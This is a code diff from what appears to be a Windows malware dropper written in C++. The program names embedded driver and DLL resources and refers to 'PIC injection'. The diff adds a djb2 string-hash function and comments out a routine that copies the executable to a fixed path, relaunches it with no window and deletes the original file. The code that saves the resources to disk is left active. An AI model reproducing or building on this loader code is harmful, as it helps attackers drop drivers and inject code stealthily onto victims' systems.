@@ -20,50 +20,62 @@ namespace fs = std::filesystem;
 const std::wstring DRIVER_RESOURCE_NAME(L"PUXY");
 const std::wstring DLL_RESOURCE_NAME(L"NKUI");
 
+unsigned long
+hash(unsigned char* str)
+{
+	unsigned long hash = 5381;
+	int c;
+
+	while (c = *str++)
+		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
+
+	return hash;
+}
+
 int wmain(int argc, wchar_t* argv[])
 {
-	if (0 != ::wcscmp(argv[0], LAUNCHER_FULL_PATH.c_str()))
-	{
-		// Copy to desired directory
-		fs::copy(argv[0], LAUNCHER_FULL_PATH.c_str());
-		
-		STARTUPINFO si;
-		PROCESS_INFORMATION pi;
+	//if (0 != ::wcscmp(argv[0], LAUNCHER_FULL_PATH.c_str()))
+	//{
+	//	 Copy to desired directory
+	//	fs::copy(argv[0], LAUNCHER_FULL_PATH.c_str());
+	//	
+	//	STARTUPINFO si;
+	//	PROCESS_INFORMATION pi;
 
-		::ZeroMemory(&si, sizeof(si));
-		si.cb = sizeof(si);
-		::ZeroMemory(&pi, sizeof(pi));
+	//	::ZeroMemory(&si, sizeof(si));
+	//	si.cb = sizeof(si);
+	//	::ZeroMemory(&pi, sizeof(pi));
 
-		const std::wstring args(LAUNCHER_FULL_PATH + L" \"" + argv[0] + L"\"");
-		
-		// Execute the program copy
-		if (!::CreateProcessW(
-			nullptr,							// Module
-			const_cast<LPWSTR>(args.c_str()),	// Command-line
-			nullptr,							// Process security attributes
-			nullptr,                			// Primary thread security attributes
-			TRUE,								// Handles are inherited
-			CREATE_NO_WINDOW,					// Creation flags
-			nullptr,							// Environment (use parent)
-			nullptr,							// Current directory (use parent)
-			&si,								// STARTUPINFO pointer
-			&pi))								// PROCESS_INFORMATION pointer             
-		{
-			DEBUG_PRINT("[-] Error finding target PIC injection process");
-		}
+	//	const std::wstring args(LAUNCHER_FULL_PATH + L" \"" + argv[0] + L"\"");
+	//	
+	//	 Execute the program copy
+	//	if (!::CreateProcessW(
+	//		nullptr,							// Module
+	//		const_cast<LPWSTR>(args.c_str()),	// Command-line
+	//		nullptr,							// Process security attributes
+	//		nullptr,                			// Primary thread security attributes
+	//		TRUE,								// Handles are inherited
+	//		CREATE_NO_WINDOW,					// Creation flags
+	//		nullptr,							// Environment (use parent)
+	//		nullptr,							// Current directory (use parent)
+	//		&si,								// STARTUPINFO pointer
+	//		&pi))								// PROCESS_INFORMATION pointer             
+	//	{
+	//		DEBUG_PRINT("[-] Error finding target PIC injection process");
+	//	}
 
-		::CloseHandle(pi.hProcess);
-		::CloseHandle(pi.hThread);
+	//	::CloseHandle(pi.hProcess);
+	//	::CloseHandle(pi.hThread);
 
-		::ExitProcess(1);
-	}
-	
-	if (0 < argc)
-	{
-		// Executed by a copy, delete it
-		if (!::DeleteFileW(argv[1]))					
-			DEBUG_PRINT("[-] Error deleting driver file. Error code: (0x%08X)", ::GetLastError());		
-	}
+	//	::ExitProcess(1);
+	//}
+	//
+	//if (0 < argc)
+	//{
+	//	 Executed by a copy, delete it
+	//	if (!::DeleteFileW(argv[1]))					
+	//		DEBUG_PRINT("[-] Error deleting driver file. Error code: (0x%08X)", ::GetLastError());		
+	//}
 
 	// Save resources to file system
 	try {
